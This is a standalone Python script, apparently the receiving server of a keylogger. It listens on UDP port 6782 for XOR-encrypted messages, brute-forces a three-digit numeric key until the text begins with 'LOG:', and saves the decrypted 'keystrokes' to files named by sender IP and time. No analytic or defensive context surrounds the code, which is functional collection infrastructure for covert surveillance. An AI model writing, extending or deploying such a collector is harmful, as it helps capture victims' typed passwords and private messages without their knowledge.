import socket
import itertools
import string
from datetime import datetime

def decrypt(text, key):
    return ''.join(chr(ord(char) ^ ord(key[i % len(key)])) for i, char in enumerate(text))

def bruteforce_decrypt(encrypted_text):
    charset = string.digits
    for key in itertools.product(charset, repeat=3):
        key = ''.join(key)
        decrypted_text = decrypt(encrypted_text, key)
        if decrypted_text.startswith("LOG:"):
            return decrypted_text, key
    return None, None

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('127.0.0.1', 6782))
    print("Server listening on 127.0.0.1:6782")

    while True:
        data, addr = server_socket.recvfrom(1024)
        encrypted_text = data.decode('utf-8')
        decrypted_text, key = bruteforce_decrypt(encrypted_text)
        if decrypted_text:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{addr[0]}_{timestamp}.txt"
            with open(filename, "w") as file:
                file.write(decrypted_text[4:])  # Exclude "LOG:"
            print(f"Decrypted keystrokes saved to {filename}, Key used: {key}")

if __name__ == "__main__":
    start_server()
